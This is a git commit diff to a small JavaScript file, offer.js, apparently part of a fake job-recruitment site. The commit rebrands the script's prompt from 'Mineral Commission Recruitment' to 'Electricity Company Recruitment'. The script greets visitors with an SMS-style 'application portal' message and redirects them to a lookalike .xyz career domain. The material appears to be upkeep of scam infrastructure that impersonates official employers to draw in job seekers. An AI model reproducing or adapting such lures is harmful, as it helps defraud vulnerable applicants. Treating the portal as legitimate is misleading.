e951f5e57fe101ac1ea4729a9dc94c02124851ab
essac5523me <essac5523+me@gmail.com>
2025-07-18 05:04:47 +0100

    Update offer.js

--- offer.js
+++ offer.js
@@ -1,6 +1,6 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
-var password = 'Mineral Commission Recruitment'
-password=prompt('SMS: Welcome to the application portal, press OK to apply now  ','Mineral Commission Recruitment');
-if (password != 'Mineral Commission Recruitment') {
+var password = 'Electricity Company Recruitment'
+password=prompt('SMS: Welcome to the application portal, press OK to apply now  ','Electricity Company Recruitment');
+if (password != 'Electricity Company Recruitment') {
 location.href='https://mincom-career.goprogram.xyz/Job';
 }
